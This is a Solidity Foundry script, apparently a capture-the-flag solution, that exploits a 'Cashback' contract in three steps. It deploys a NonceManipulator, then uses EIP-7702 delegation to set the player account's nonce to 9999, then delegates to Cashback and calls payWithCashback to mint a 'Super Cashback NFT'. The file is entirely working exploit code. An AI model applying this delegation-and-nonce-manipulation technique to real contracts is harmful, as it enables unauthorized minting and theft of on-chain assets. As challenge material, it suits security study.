// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {Cashback, Currency, CurrencyLibrary} from "../src/Cashback.sol";
import {NonceManipulator} from "../src/NonceManipulator.sol";

contract Exploit is Script {
    using CurrencyLibrary for Currency;

    function run() external {
        uint256 playerPk = vm.envUint("USER_PRIVATE_KEY");
        address player = vm.addr(playerPk);
        address cashbackAddr = vm.envAddress("CASHBACK_ADDRESS");
        
        console.log("Player:", player);
        console.log("Cashback:", cashbackAddr);

        // ========== Step 1: NonceManipulator 배포 ==========
        vm.broadcast(playerPk);
        NonceManipulator manipulator = new NonceManipulator();
        console.log("NonceManipulator deployed:", address(manipulator));
    }
}

contract ExploitStep2 is Script {
    function run() external {
        uint256 playerPk = vm.envUint("USER_PRIVATE_KEY");
        address player = vm.addr(playerPk);
        address manipulatorAddr = vm.envAddress("MANIPULATOR_ADDRESS");
        
        // ========== Step 2: Delegate to Manipulator + setNonce() ==========
        // EIP-7702 authorization 생성 및 첨부
        vm.signAndAttachDelegation(manipulatorAddr, playerPk);
        
        vm.broadcast(playerPk);
        // player 주소로 호출하지만, delegate된 NonceManipulator 코드가 실행됨
        NonceManipulator(player).setNonce();
        
        console.log("Nonce set to 9999");
    }
}

contract ExploitStep3 is Script {
    using CurrencyLibrary for Currency;
    
    function run() external {
        uint256 playerPk = vm.envUint("USER_PRIVATE_KEY");
        address player = vm.addr(playerPk);
        address cashbackAddr = vm.envAddress("CASHBACK_ADDRESS");
        
        // ========== Step 3: Delegate to Cashback + payWithCashback() ==========
        vm.signAndAttachDelegation(cashbackAddr, playerPk);
        
        vm.broadcast(playerPk);
        Cashback(payable(player)).payWithCashback(
            CurrencyLibrary.NATIVE_CURRENCY,
            player,
            0
        );
        
        console.log("Super Cashback NFT minted!");
    }
}
